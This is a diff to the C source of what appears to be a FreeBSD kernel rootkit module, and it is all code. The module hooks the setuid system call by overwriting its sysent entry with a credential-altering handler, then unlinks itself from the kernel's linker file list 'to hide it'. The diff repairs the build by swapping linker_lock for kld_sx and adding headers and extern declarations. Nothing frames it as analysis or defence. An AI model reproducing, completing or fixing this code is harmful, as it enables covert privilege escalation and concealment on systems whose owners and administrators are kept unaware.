@@ -4,7 +4,11 @@
 #include <sys/systm.h>
 #include <sys/proc.h>
 #include <sys/sysent.h>
-#include <sys/syscall.h>
+#include <sys/sysproto.h>   // struct setuid_args 
+#include <sys/syscall.h>    // SYS_setuid         
+#include <sys/mutex.h>
+#include <sys/sx.h>
+#include <sys/queue.h>
 #include <sys/ucred.h>
 #include <sys/linker.h>
 #include <sys/lock.h>
@@ -33,6 +37,10 @@ static int hooked_setuid(struct thread *td, void *syscall_args) {
 	crfree(oldcred);
 	return (0);
 }
+
+extern struct sx kld_sx;
+extern linker_file_list_t linker_files;
+
 // Load/unload event handler.
 static int load(struct module *module, int cmd, void *arg) {
 	int error = 0;
@@ -42,7 +50,7 @@ static int load(struct module *module, int cmd, void *arg) {
 		original_setuid = sysent[SYS_setuid].sy_call;
 		sysent[SYS_setuid].sy_call = (sy_call_t *)hooked_setuid;
 
-		sx_xlock(&linker_lock);
+		sx_xlock(&kld_sx);
 
 		//unlink the file to hide it
 		struct linker_file *linker_file;
@@ -52,7 +60,7 @@ static int load(struct module *module, int cmd, void *arg) {
 				break;
 			}
 		}
-		sx_xunlock(&linker_lock);
+		sx_xunlock(&kld_sx);
 
 		break;
 	case MOD_UNLOAD:
